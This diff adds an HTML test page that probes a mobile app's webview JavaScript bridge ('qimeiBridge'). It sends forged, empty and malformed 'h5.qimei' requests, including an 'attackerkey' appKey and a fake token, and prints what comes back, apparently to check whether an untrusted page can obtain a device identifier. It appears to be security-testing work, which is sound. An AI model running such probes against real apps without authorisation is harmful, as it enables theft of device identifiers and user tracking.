@@ -1,0 +1,23 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>PQMEI</title>
+<style>body{background:#fff;color:#000;font:12px monospace;word-break:break-all}</style></head>
+<body><div id="out">START</div>
+<script>
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
+function w(t){document.getElementById('out').innerHTML += '<br>' + esc(t);}
+w('URL=' + location.href);
+window.qimeiCallback = function(d){ w('QMEI_CB=' + String(d).slice(0,300)); };
+setTimeout(function(){
+  try {
+    w('qimeiBridge type=' + typeof qimeiBridge + ' methods=' + Object.getOwnPropertyNames(Object.getPrototypeOf?qimeiBridge:qimeiBridge).slice(0,10).join(','));
+    var m1 = qimeiBridge.postMessage(JSON.stringify({handlerName:'h5.qimei', appKey:'attackerkey', time:String(Math.floor(Date.now()/1000)), token:'deadbeef'}));
+    w('RET_garbage_token=' + m1);
+    var m2 = qimeiBridge.postMessage(JSON.stringify({handlerName:'h5.qimei', appKey:'', time:'', token:''}));
+    w('RET_empty_fields=' + m2);
+    var m3 = qimeiBridge.postMessage('not-json');
+    w('RET_notjson=' + m3);
+    var m4 = qimeiBridge.postMessage(JSON.stringify({handlerName:'h5.qimei', appKey:'k', time:'1700000000', token:'00'}));
+    w('RET_short_token=' + m4);
+  } catch(e) { w('ERR=' + e.message); }
+  w('DONE');
+}, 1000);
+</script></body></html>
